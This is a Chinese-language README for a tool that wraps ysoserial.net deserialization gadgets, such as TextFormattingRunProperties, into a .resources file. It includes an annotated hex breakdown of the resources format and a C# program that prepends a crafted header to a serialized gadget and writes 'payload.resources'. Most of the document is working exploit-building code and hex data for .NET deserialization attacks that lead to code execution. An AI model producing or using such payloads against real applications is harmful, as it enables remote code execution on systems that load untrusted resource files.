# ResourcesPayload

解决`ysoserial.net` 中 `TextFormattingRunProperties`等 gadget 因为执行报错无法成功生成Resources文件的问题


Resources文件格式


```
CECAEFBE 标识头//0xBEEFCACE
01 ResourceManager头版本
00000091 ResMgr header总字节数
0000006C ResMgr header 长度
53797374656D2E5265736F75726365732E5265736F757263655265616465722C206D73636F726C69622C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D623737613563353631393334653038392353797374656D2E5265736F75726365732E52756E74696D655265736F75726365536574  //ResMgr
02 版本//File format version number
00000001 //resources数量
00000001 //type数量
00000050 //typeNames 长度
446F6E6F72436F6C756D6E732C20436F6E736F6C65417070332C2056657273696F6E3D312E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6E756C6C //typeNames
504144504144  //pad填充
8500950D  //hash
00000000   //pos
1B010000   //start Of DataSection
0A5400690074006C00650000000000  //name Section
400001000000FFFFFFFF01000000000000000C0200000042436F6E736F6C65417070332C2056657273696F6E3D312E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6E756C6C05010000000C446F6E6F72436F6C756D6E7305000000024944044E616D6505546F74616C044C61737403416D74010101010102000000060300000009456D706C79656520230604000000044E616D6506050000000C546F74616C20416D6F756E740606000000124C61737420446F6E6174696F6E20446174650607000000144C61737420446F6E6174696F6E20416D6F756E740B   //data section

```

这个项目主要是一键`TextFormattingRunProperties`，其他gadget可以使用如下转换

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace test
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Please provide necessary information:");
                Console.WriteLine("ResourcesPayload.exe <file>");
                Console.WriteLine("Example: ResourcesPayload.exe c;\\1.bin");
                return;
            }

            string file = args[0];

            byte[] ResourcesDataSection;
            string Resources_header = "CECAEFBE01000000910000006C53797374656D2E5265736F75726365732E5265736F757263655265616465722" +
                          "C206D73636F726C69622C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C" +
                          "205075626C69634B6579546F6B656E3D623737613563353631393334653038392353797374656D2E5265736F7" +
                          "5726365732E52756E74696D655265736F75726365536574020000000100000001000000CF0153797374656D2E" +
                          "436F6C6C656374696F6E732E47656E657269632E536F7274656453657460315B5B53797374656D2E537472696" +
                          "E672C206D73636F726C69622C2056657273696F6E3D342E302E302E302C2043756C747572653D6E6575747261" +
                          "6C2C205075626C69634B6579546F6B656E3D623737613563353631393334653038395D5D2C2053797374656D2" +
                          "C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579" +
                          "546F6B656E3D623737613563353631393334653038395041445041447B5645BF00000000BF0100002E4200690" +
                          "06E0061007200790046006F0072006D00610074007400650072005F005000610079006C006F00610064000000" +
                          "000040";

            FileStream fs = new FileStream(file, FileMode.Open);
            byte[] TextFormattingRunPropertiesString = new byte[fs.Length];
            fs.Read(TextFormattingRunPropertiesString, 0, TextFormattingRunPropertiesString.Length);
            ResourcesDataSection = HexToByte(Resources_header);
            byte[] Resources_new = new byte[TextFormattingRunPropertiesString.Length + ResourcesDataSection.Length];
            ResourcesDataSection.CopyTo(Resources_new, 0);
            TextFormattingRunPropertiesString.CopyTo(Resources_new, ResourcesDataSection.Length);
            System.IO.File.WriteAllBytes("payload.resources", Resources_new);
            fs.Close();
        }

        public static byte[] HexToByte(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
    }
}

```

相关链接：https://mp.weixin.qq.com/s/FW5yk3LdJd3K53fObYTpmw
